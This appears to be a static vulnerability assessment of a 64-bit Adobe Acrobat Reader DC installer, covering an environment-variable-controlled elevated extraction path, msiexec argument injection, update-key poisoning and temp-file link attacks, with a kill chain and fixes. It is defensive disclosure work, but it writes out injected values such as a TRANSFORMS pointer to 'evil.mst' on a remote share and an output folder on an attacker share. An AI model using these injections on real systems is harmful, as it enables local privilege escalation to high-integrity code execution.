# Security Assessment — Adobe Acrobat Reader DC Installer

**Target:** `AcroRdrDCx642600322110_en_US.exe`
**Product:** Adobe Acrobat Reader DC (26.003.22110), 64-bit
**SHA-256:** `a7149f099dba2f868b65c2e4d62149fe411490fbb622192725fcc9ecfaa03852`
**MD5:** `316fdcb2ea46afc79e0e17e4eb8fc51f`
**Size:** 720,610,920 bytes
**Format:** PE32+ GUI x86-64 — Adobe Self Extractor (7z/LZMA2 payload)
**Analyst:** 0xRobotnick
**Date:** 2026-11-20
**Assessment type:** Static reverse engineering (binary + embedded bootstrap), local target

---

## 1. Executive Summary

The installer is a signed Adobe self-extracting bootstrapper that requests
`requireAdministrator`, decompresses a ~719 MB 7z payload, extracts the
bootstrapper (`setup.exe`) and its package configuration (`setup.ini`,
`AcroPro.msi`, an update `.msp`, `Core.cab`) into a working directory, and then
executes `setup.exe` elevated. `setup.exe` in turn builds and launches an
elevated `msiexec.exe` command line from `setup.ini`.

Two high-impact weaknesses combine into a high-integrity code-execution chain:

1. **The privileged extraction/execution directory is derived from the
   user-overridable environment variable `%CommonProgramW6432%`**, not from a
   trusted Known Folder API. A local user can redirect the elevated
   self-extractor to a writable directory or a UNC share they control, then
   serve a tampered `setup.exe` / `setup.ini`.
2. **`setup.exe` consumes attacker-influenceable `setup.ini` values
   (`msi`, `CmdLine`, `PATCH`) and passes them to an elevated `msiexec.exe`
   without verifying the Authenticode signature of the package.** This yields
   arbitrary MSI/MSP installation and msiexec property injection.

Additional confirmed issues: the environment-derived path is written into the
**HKLM Adobe ARM update key (`WebMsiPath`)**, enabling update-channel path
poisoning; a **predictable log file in `%TEMP%`** is opened by the elevated
process (reparse-point/overwrite risk); a **fixed named pipe** is opened for
writing; and **ASLR is not enabled** despite the presence of other mitigations.

The binary is genuinely signed by Adobe (DigiCert) and the signature is
cryptographically valid; this is **not** a tampered or trojanized binary. The
findings are design/implementation weaknesses in an authentic installer.

---

## 2. Scope and Method

- Binary identification, PE structure, section and overlay mapping.
- Authenticode signature extraction and cryptographic verification
  (hash-of-image comparison and RSA verification over signed attributes).
- Import/export/resource/version/redirection enumeration.
- Embedded payload enumeration (archive and cabinet listing).
- Static disassembly of the self-extractor loader and of `setup.exe`
  bootstrap logic, focused on path construction, process creation, package
  invocation, registry writes, temporary-file handling, and command-line
  parsing.
- Trust-boundary analysis of user-controllable inputs (environment variables,
  command line, INI files, file system locations, named objects).

No exploit was executed against a Windows host; severity below distinguishes
**CONFIRMED** (vulnerable code path proven statically) from **THEORETICAL**
(impact depends on unverified runtime behaviour). Dynamic Windows validation is
the remaining step for the CONFIRMED items.

---

## 3. Attack Surface Inventory

| Surface | Detail |
|---|---|
| Elevation | `requireAdministrator` manifest on the self-extractor and on `setup.exe` |
| Environment | `%CommonProgramW6432%` expanded to build the install/extract path |
| Command line | `/msi <args>`, `/ini "PATH"`, `/setupcmd`, output-folder and pass-to-setup parameters |
| INI configuration | `setup.ini` `[Product]` keys `msi`, `CmdLine`, `PATCH`; embedded `ADOBE_SFX_INI` |
| Registry | Writes `WebMsiPath` to `HKCU/HKLM\SOFTWARE\Adobe\Adobe ARM\1.0\ARM` |
| File system | Extraction into `INSTALLPATH`; logs in `%TEMP%`; support folder under Common Files |
| Named objects | Fixed pipe `\\.\pipe\32B6B37A-4A7D-4e00-95F2-6F0BF3DE3E00` |
| Update channel | Adobe ARM registry value + `armsvc.exe`/`adobearm.exe` in payload |
| Network | No network API imports (no telemetry/C2 in the bootstrap) |
| Embedded payload | 719,522,959-byte 7z (6 files) + `Core.cab` (723 entries, 22 EXE, 260 DLL) |

---

## 4. Findings

### ACRO-01 — Privileged install path controlled by `%CommonProgramW6432%` — CONFIRMED (static)

**Severity: Critical** (High where elevation does not inherit the caller's environment)
**CWE:** CWE-426 (Untrusted Search Path), CWE-807 (Reliance on Untrusted Inputs)

**Evidence**
- `ExpandEnvironmentStringsW("%CommonProgramW6432%")` at `0x14000bbe3`.
- The result is appended with `\Adobe\Acrobat\Setup\` and `\RDC` to form
  `INSTALLPATH`.
- `INSTALLPATH` is the extraction target (passed to the archive extractor at
  `0x14000bcd5` → `0x14000abe4`) and the base for
  `Run=%INSTALLPATH%\setup.exe` (substitution at `0x14000cc9d`).
- The elevated loader launches `"%INSTALLPATH%\setup.exe" /msi DISABLE_CACHE=1`
  via `CreateProcessW` (`0x14000d231`) / `ShellExecuteW` (`0x14003c861`).
- No canonicalization, ownership, or reparse-point check is performed on the
  expanded path. By contrast, the support/temp working directory correctly uses
  `SHGetKnownFolderPath(FOLDERID_ProgramFilesCommon)`, showing the safe pattern
  was available but not used for `INSTALLPATH`.

**Impact**
A local user sets `HKCU\Environment\CommonProgramW6432` to a writable directory
or to a UNC share they control. When the installer is elevated in that user's
context, the high-integrity self-extractor creates the directory tree there,
extracts `setup.exe`/`setup.ini`/packages into it, and executes `setup.exe` from
it. On a UNC share the attacker's SMB server controls every read, so a tampered
`setup.exe`, `setup.ini`, MSI, or MSP can be served deterministically without a
race. The only path check is a substring regular expression on
`Common Files\Adobe`, which the attacker can satisfy by naming the target path
accordingly.

**Why it matters:** a high-integrity process executes code/config from an
attacker-controlled location. Chained with ACRO-03 this is arbitrary code
execution at high integrity.

---

### ACRO-03 — `setup.ini` package values injected into elevated `msiexec` — CONFIRMED (static)

**Severity: Critical** (in combination with ACRO-01)
**CWE:** CWE-88 (Argument Injection), CWE-345 (Missing Signature Verification)

**Evidence**
- `setup.exe` reads `[Product]` keys: `msi` (`0x14005eba0`), `CmdLine`
  (`0x14005eba8`), `PATCH` (`0x14005ebd8`).
- It formats an msiexec command line:
  - `"%s" /i "%s" %s REBOOT="ReallySuppress"` (`0x14005f5f0`)
  - ` PATCH="` + patch value (`0x14005f4f0`)
  - an alternate unquoted variant `"%s" /i %s %s ...` (`0x14005f590`)
- The command is launched with `CreateProcessW` at `0x1400052fe`.
- The `CmdLine` value is inserted **unquoted**.
- No package signature verification: the binary imports no `wintrust`/`crypt32`
  APIs and no `MsiGetFileSignatureInformation`; the `\Installer\SourceHash`
  logic only covers `Intermediate/Extras/Optional/Languages.cab`, not the MSI
  or MSP.

**Impact**
An attacker-influenced `setup.ini` sets `msi=`/`PATCH=` to a malicious MSI/MSP
and/or sets `CmdLine=TRANSFORMS="\\host\share\evil.mst"` (or other msiexec
properties). `msiexec` then installs the attacker package; its custom actions
run elevated. Combined with ACRO-01 this is high-integrity RCE.

---

### ACRO-05 — Update-channel path poisoning via `WebMsiPath` — CONFIRMED write (impact partly THEORETICAL)

**Severity: High**
**CWE:** CWE-15 (External Control of System Setting), CWE-426

**Evidence**
- The environment-derived `INSTALLPATH` is written as the value `WebMsiPath`
  under `HKCU\SOFTWARE\Adobe\Adobe ARM\1.0\ARM` and
  `HKLM\SOFTWARE\Adobe\Adobe ARM\1.0\ARM` using `RegCreateKeyExW`
  (`0x14001d217`) and `RegSetValueExW` (`0x14001d23d`).
- Error strings: “Failed to register WebMsiPath in HKCU/HKLM”
  (`0x14007d490`, `0x14007d4e0`).
- The payload `Core.cab` contains `armsvc.exe` (Adobe Acrobat Update Service)
  and `adobearm.exe`/`adobearmhelper.exe`.

**Impact**
Because the self-extractor is elevated, the attacker's path is written into a
**machine-wide** update key. If Adobe ARM consumes `WebMsiPath` to locate/launch
the update package, the attacker path is later used by a SYSTEM service,
yielding persistence and SYSTEM-level code execution. The write is confirmed;
consumption by `armsvc.exe` is **THEORETICAL** and should be validated on a
Windows host.

---

### ACRO-06 — Predictable elevated log file in `%TEMP%` (reparse/overwrite) — CONFIRMED (static)

**Severity: Medium–High**
**CWE:** CWE-377 (Insecure Temporary File), CWE-59 (Link Following)

**Evidence**
- Log path built from `GetTempPathW` + `AdobeSFX.log` (`0x140015b8a`,
  `0x14007ff98`), with fallbacks `AdobeSFX_NotLocked.log` (`0x14007ffb8`) and
  `AdobeSFX_Backup.log` (`0x14007ffe8`).
- The elevated process opens the log for writing; the fallback path sets
  `FILE_ATTRIBUTE_NORMAL` and deletes the file before retrying
  (`0x140015c8f`, `0x140015c9a`), which is also an oplock race lever.
- File creation follows reparse points (no `FILE_FLAG_OPEN_REPARSE_POINT`).

**Impact**
A local user can pre-create `%TEMP%\AdobeSFX.log` as a symbolic link or hard
link to a privileged file. The elevated installer opens it and writes
attacker-influenced log text, corrupting/overwriting the target (availability
impact; code-execution potential depends on the chosen target and content).

---

### ACRO-04 — `/msi` argument injection into the elevated msiexec line — CONFIRMED (static)

**Severity: Medium**
**CWE:** CWE-88

**Evidence**
- The `/msi` remainder is parsed verbatim (`0x14000f92e`) and appended as the
  unquoted third `%s` of the msiexec format string.
- No allow-list of MSI properties is applied.

**Impact**
A caller passing `/msi TRANSFORMS="\\host\share\x.mst"` (or other properties)
injects msiexec options when `setup.exe` is run elevated. Requires admin
consent (UAC) unless reached through ACRO-01.

---

### ACRO-07 — Fixed named pipe opened for writing (squatting) — CONFIRMED (static)

**Severity: Low–Medium**
**CWE:** CWE-340/CWE-362 (predictable named object)

**Evidence**
- `\\.\pipe\32B6B37A-4A7D-4e00-95F2-6F0BF3DE3E00` (`0x14007e4c0`) opened with
  `GENERIC_WRITE`, `OPEN_EXISTING` (`0x14000b0a6`).

**Impact**
A local user can create the pipe first and receive the elevated process's log/
telemetry stream (information disclosure) or induce failure (DoS). No direct
code execution.

---

### ACRO-08 — ASLR disabled on the bootstrap — CONFIRMED

**Severity: Low–Medium (defense-in-depth)**
**CWE:** CWE-693 (Protection Mechanism Failure)

**Evidence**
- `DllCharacteristics = 0xC120`: `NX_COMPAT`, `GUARD_CF`,
  `TERMINAL_SERVER_AWARE`, `HIGH_ENTROPY_VA` are set, but **`DYNAMIC_BASE`
  (ASLR) is not**.
- Base relocation directory is empty (`RVA 0`, size `0`) and no section carries
  relocations; image is fixed at `0x140000000`.

**Impact**
Any future memory-corruption defect in the bootstrap would be reliably
exploitable (fixed addresses). No memory-corruption defect was identified in
this review.

---

### ACRO-09 — Command-line `outputFolder_` overrides the elevated INSTALLPATH — CONFIRMED (static)

**Severity: High–Critical**
**CWE:** CWE-73 (External Control of File Name or Path), CWE-88

**Evidence**
- Command-line parser (`0x14000671c`, invoked with `GetCommandLineW` at
  `0x140007782`) accepts the `_o` option and stores it as `outputFolder_`
  (parser struct `+0x10`, logged as “CommandParam outputFolder_” at
  `0x140007252`).
- At `0x140007814`–`0x140007832`, a non-null `outputFolder_` is copied directly
  into the `INSTALLPATH` field (`0x14000cc…` uses `0x210`), which is the
  extraction target and the base of `Run=%INSTALLPATH%\setup.exe`.
- This bypasses the environment-variable route entirely: the path is provided
  as an argument to the elevated process itself.

**Impact**
An attacker who can influence the command line used to launch the installer
(malicious shortcut/Run key/URL handler/script, or a user persuaded to run a
crafted command) supplies `-o \\attacker\share\...` and gets privileged
extraction + `setup.exe` execution from an attacker-controlled location —
the same code-execution primitive as ACRO-01, with no dependence on
environment inheritance across the elevation boundary.

---

### ACRO-10 — Command-line `passToSetup_` fed into the elevated setup.exe launch line — CONFIRMED (static flow)

**Severity: High**
**CWE:** CWE-88 (Argument Injection)

**Evidence**
- The parser stores `passToSetup_` (struct `+0x18`); it is copied to the
  application object at `0x1400077d2` (`[rsi+0x218]`).
- `[rsi+0x218]` is consumed at `0x14000cd22` in the routine that assembles the
  `setup.exe` launch line alongside the `[INSTALL] SetupArgs1` and `SetupArgs2`
  keys (`0x14007ed00`/`0x14007ed18`) and `%INSTALLPATH%\setup.exe`.
- No quoting or allow-listing of the value is evident.

**Impact**
A caller-supplied `passToSetup_` argument is injected into the command line of
the elevated `setup.exe`. Combined with `setup.exe`'s `/ini` and `/msi`
handling (ACRO-03/ACRO-14), this allows arbitrary installer configuration /
package selection at high integrity. Exact concatenation should be confirmed
dynamically.

---

### ACRO-11 — Payload integrity validation is conditional/skipped — CONFIRMED (static)

**Severity: Medium**
**CWE:** CWE-353 (Missing Integrity Check)

**Evidence**
- Validation is gated on flags (`[rsi+0x1cc]`, `[rsi+0x1d0]`) set from parsed
  parameters; the default path logs “Skipping validation - SFX not ready to
  validate files.” (`0x14007d530`, `0x14000810c`).
- The `\Installer\SourceHash` logic only covers
  `Intermediate/Extras/Optional/Languages.cab`, not `setup.exe`, `setup.ini`,
  the MSI, or the MSP.
- The validation mode is also exposed as a switch (`/sfix_sourcehash`,
  `bValidate_`).

**Impact**
The elevated extractor does not, by default, verify the integrity/signature of
the files it stages and executes. This is what makes ACRO-01 / ACRO-09
tampering effective.

---

### ACRO-12 — Sensitive data logged to `%TEMP%` and a predictable pipe — CONFIRMED (static)

**Severity: Low**
**CWE:** CWE-532 (Information Exposure Through Log Files)

**Evidence**
- The log stream records the command line (“CreateProcess cmdLine:”,
  “eCommandParam CmdLine:”), parsed parameter values, paths, and product
  config, written to `%TEMP%\AdobeSFX*.log` and, when the file sink is
  unavailable, to `\\.\pipe\32B6B37A-…`.
- These sinks are reachable by a local user (ACRO-06/ACRO-07).

**Impact**
Disclosure of paths, product codes, and command lines to a local user; useful
for reconnaissance and for timing the ACRO-01/ACRO-06 attacks.

---

### ACRO-13 — Single-instance named-object squatting — CONFIRMED (static)

**Severity: Low**
**CWE:** CWE-340 / CWE-362 (Predictable named object / race)

**Evidence**
- `GlobalAddAtomW` (`0x140068158`) / `GlobalFindAtomW` (`0x140068170`) and
  `CreateEventW` (`0x140068598`) are used for instance coordination; the pipe
  name is fixed (`0x14007e4c0`).

**Impact**
A local user can pre-create/squat the atom/event/pipe to suppress or confuse
the installer instance (denial of service). No code execution.

---

### ACRO-14 — `setup.exe /ini "PATH"` accepts an arbitrary configuration file — CONFIRMED (static)

**Severity: Medium**
**CWE:** CWE-73 / CWE-88

**Evidence**
- `setup.exe` documents and parses `/ini "PATH"` (“Alternative initialization
  file”, `0x140060da2` help text; parse handling around `0x14001066b`).
- The INI supplies `[Product] msi=`, `CmdLine=`, `PATCH=`, which feed the
  elevated `msiexec` line (ACRO-03).

**Impact**
Any caller able to run `setup.exe` elevated with `/ini \\host\share\x.ini`
(or reach it via ACRO-10) selects an arbitrary MSI/MSP/transform. Requires UAC
consent unless reached through ACRO-01/ACRO-09/ACRO-10.

---

### ACRO-15 — Build-path / PDB disclosure — CONFIRMED (static, informational)

**Severity: Informational**
**CWE:** CWE-200

- Debug PDB name `AdobeSelfExtractor.pdb`; embedded MFC source paths
  (`D:\a\_work\1\s\src\vctools\...`) are present. Minor reconnaissance value.

---

### ACRO-02 — “Signature has no RFC 3161 timestamp” — **REJECTED (false positive, corrected)**

The earlier assertion that the signature lacks a timestamp is **incorrect**. On
re-examination, the `signerInfo.unsignedAttrs` of both the self-extractor and
`setup.exe` contains a `microsoft_time_stamp_token`
(OID `1.3.6.1.4.1.311.3.3.1`) holding a full RFC 3161 `TimeStampToken`
(eContentType `1.2.840.113549.1.9.16.1.4`). The token's TSA chain is embedded:

- TSA signer: `DigiCert SHA256 RSA4096 Timestamp Responder 2026 1`
- Issuer: `DigiCert Trusted G4 TimeStamping RSA4096 SHA256 2025 CA1`
- Root: `DigiCert Trusted Root G4` (via `DigiCert Assured ID Root CA`)

Therefore the code signatures are timestamped and remain verifiable after the
Adobe leaf certificate expires (2027-10-05). No finding here. (The original
detection error came from matching the wrong OID spelling; the correct value is
`microsoft_time_stamp_token`, not a dotted literal.)

---

## 5. Verified Non-Issues / Mitigations Present

- **Authenticity:** image and `setup.exe` signature and image hash verify
  against Adobe's code-signing certificate.
- **DLL search-order hijacking (delay imports):** mitigated — the binary calls
  `SetDefaultDllDirectories(0xC00)` (System32 + user dirs, no application dir)
  and `SetDllDirectoryW("")` before use; `msi.dll`, `WINSPOOL.DRV`, and
  `OLEACC.dll` therefore resolve from System32, not the application directory.
- **No network I/O:** no `wininet`/`winhttp`/`urlmon`/`ws2_32` imports.
- **Support/temp working directory:** uses
  `SHGetKnownFolderPath(FOLDERID_ProgramFilesCommon)` (admin-only), unlike the
  `INSTALLPATH` construction.
- **No exports**; Control Flow Guard and NX enabled.
- **Authenticode timestamp:** present — Microsoft RFC 3161 token
  (`microsoft_time_stamp_token`) on both the self-extractor and `setup.exe`,
  TSA `DigiCert SHA256 RSA4096 Timestamp Responder 2026 1`.
- **MSI package signature:** `AcroPro.msi` is signed by `Adobe Inc.` under
  `DigiCert EV Code Signing CA (SHA2)` with a timestamp (note: the installer
  does not verify it — see ACRO-03).
- **CFG /GS effective:** load configuration carries `SecurityCookie`
  (`0x14008f680`), `GuardCFCheckFunctionPointer`, `GuardCFDispatchFunctionPointer`,
  and a `GuardCFFunctionTable` with 664 entries; `GuardFlags = 0x10017500`
  (CF instrumented, function table present, delay-load IAT protected).
- **Dynamic observation (limited fidelity):** executing the bootstrap under a
  compatible loader confirms it stages into
  `Common Files\Adobe\Acrobat\Temp\<pid>\config.bin` (the secure support folder).
  The tested `-o <dir>` form did not redirect the install path there; the exact
  command-line spelling that maps to `outputFolder_` must be confirmed on
  Windows (static data flow to `INSTALLPATH` is confirmed).

### Rejected hypotheses / corrections

- **ACRO-02 (no timestamp):** rejected — a valid RFC 3161 timestamp token is
  present (see above).
- **DLL delay-load hijacking:** rejected — mitigated by
  `SetDefaultDllDirectories(0xC00)`; the direct `LoadLibraryW("Comctl32.dll")`
  call is covered by the same default-directory policy on Windows 8+/10.
- **Embedded PE / hidden payload in resources:** rejected — resources contain
  only `ADOBE_SFX_INI`, dialogs, icons, bitmaps, string tables, version info,
  and the manifest; the payload is solely the 7z overlay.
- **Network C2 / phone-home:** rejected — no networking APIs imported.
- **Unsafe imported C string functions / obvious memory corruption:** none found
  (CRT is statically linked and the code uses MFC `CString`-style handling); no
  confirmed memory-corruption defect.
- **`/extUI` arbitrary DLL load:** rejected — external UI handling is
  in-process (`MsiSetExternalUIRecord`); no attacker-path `LoadLibrary` found.

---

## 6. Severity Summary

| ID | Title | Severity | Status |
|---|---|---|---|
| ACRO-01 | Env-var-controlled privileged install path | Critical (High if env not inherited) | CONFIRMED (static) |
| ACRO-03 | `setup.ini` → elevated msiexec, no signature check | Critical (with ACRO-01/09/10) | CONFIRMED (static) |
| ACRO-05 | `WebMsiPath` update-key poisoning | High | Write CONFIRMED; SYSTEM impact THEORETICAL |
| ACRO-09 | Command-line `outputFolder_` overrides INSTALLPATH | High–Critical | CONFIRMED (static) |
| ACRO-10 | Command-line `passToSetup_` injected into setup.exe line | High | CONFIRMED (static flow) |
| ACRO-06 | Predictable elevated `%TEMP%` log file | Medium–High | CONFIRMED (static) |
| ACRO-11 | Payload integrity validation skipped/conditional | Medium | CONFIRMED (static) |
| ACRO-14 | `setup.exe /ini "PATH"` arbitrary configuration | Medium | CONFIRMED (static) |
| ACRO-04 | `/msi` argument injection | Medium | CONFIRMED (static) |
| ACRO-07 | Fixed named pipe opened for writing | Low–Medium | CONFIRMED (static) |
| ACRO-08 | ASLR disabled | Low–Medium | CONFIRMED |
| ACRO-12 | Sensitive data in `%TEMP%` logs / pipe | Low | CONFIRMED (static) |
| ACRO-13 | Single-instance atom/event/pipe squatting | Low | CONFIRMED (static) |
| ACRO-02 | “Signature without timestamp” | — | **REJECTED** (timestamp present) |
| ACRO-15 | Build-path / PDB disclosure | Informational | CONFIRMED |

**Primary kill chain (two entry points converge):**
- ACRO-01 (env `%CommonProgramW6432%`) **or** ACRO-09 (`-o`/`outputFolder_`
  command line) redirects privileged extraction/execution to an
  attacker-controlled directory or UNC share.
- ACRO-10 (`passToSetup_`) and/or ACRO-14 (`/ini`) supply attacker
  configuration; ACRO-03 turns `setup.ini`/package values into an elevated
  `msiexec` invocation with no signature verification → arbitrary code
  execution at high integrity.
- ACRO-05 persists the attacker path in the HKLM ARM update key for later
  service-driven execution; ACRO-11 (no integrity check) is what allows the
  staged files to be swapped.

---

## 7. Recommendations

1. Replace the `%CommonProgramW6432%` expansion for `INSTALLPATH` with
   `SHGetKnownFolderPath(FOLDERID_ProgramFilesCommon)`; canonicalize and
   verify the resulting path is owned by TrustedInstaller/Administrators and is
   not a reparse point or UNC path.
2. Verify the Authenticode signature (e.g., `WinVerifyTrust` with a pinned
   publisher) of `AcroPro.msi`, the `.msp`, and any `TRANSFORMS` file before
   invoking `msiexec`; treat `setup.ini` as untrusted and validate it.
3. Quote and allow-list `CmdLine`/`msi`/`PATCH`, or avoid forwarding raw
   command-line text into `msiexec`; launch `msiexec` with a fixed argument
   vector.
4. Create log/temp files with a random name using `CREATE_NEW` and an explicit
   restrictive DACL; open with `FILE_FLAG_OPEN_REPARSE_POINT`; avoid predictable
   names in `%TEMP%`.
5. Do not write environment-derived paths into machine-wide update keys; store a
   fixed, verified installation path.
6. Give the named pipe a random name and a restrictive DACL, or use a mutex with
   a validated security descriptor.
7. Reject or tightly validate the `-o`/`outputFolder_` and `passToSetup_`
   command-line options in the elevated bootstrap; never let either select an
   execution path or inject into the `setup.exe` command line. Apply the same
   canonicalization/ownership checks as recommendation 1.
8. Perform an integrity/signature check of the staged `setup.exe`, `setup.ini`,
   MSI, and MSP before execution (enable validation unconditionally rather than
   behind `bValidate_`/`/sfix_sourcehash`).
9. Build the bootstrap with `/DYNAMICBASE` (ASLR) and add RFC 3161 timestamping
   to the signature.

---

## 8. Indicators / Artifacts

- Bootstrapper PDB: `AdobeSelfExtractor.pdb`; image base `0x140000000`.
- Embedded payload: 7z at file offset `0x107000`, 719,522,959 bytes,
  `LZMA2:26`, six entries (`setup.exe`, `setup.ini`, `AcroPro.msi`,
  `AcroRdrDCx64Upd2600322110.msp`, `Core.cab`, `abcpy.ini`).
- `ADOBE_SFX_INI`: `Run=%INSTALLPATH%\setup.exe`,
  `SetupArgs2=/msi DISABLE_CACHE=1`,
  `ProductCode={AC76BA86-1033-1033-7760-BC15014EA700}`.
- `WebMsiPath` registry location: `...\SOFTWARE\Adobe\Adobe ARM\1.0\ARM`.
- Named pipe: `\\.\pipe\32B6B37A-4A7D-4e00-95F2-6F0BF3DE3E00`.
- `Core.cab`: 723 entries (22 EXE, 260 DLL), including `armsvc.exe`,
  `adobearm.exe`, `adobearmhelper.exe`, `Acrobat.dll`, `acrocef.exe`.

---

*Prepared 2026-11-20. CONFIRMED items are proven by static code path / data
flow; dynamic Windows validation is recommended to finalize ACRO-01, ACRO-03 and
ACRO-05 impact.*
